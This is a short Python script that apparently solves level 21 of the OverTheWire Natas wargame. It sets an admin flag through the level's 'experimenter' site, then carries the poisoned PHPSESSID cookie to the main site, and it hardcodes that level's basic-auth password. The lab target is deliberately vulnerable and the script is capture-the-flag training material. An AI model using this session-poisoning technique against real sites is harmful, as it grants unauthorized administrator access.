import requests 

session = requests.Session()

response = session.get('http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&admin=1&submit=1', auth = ('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'))
print(response.text)
cookie = session.cookies["PHPSESSID"]

response = session.get('http://natas21.natas.labs.overthewire.org/', auth = ('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'), cookies = {'PHPSESSID': cookie})
print(response.text)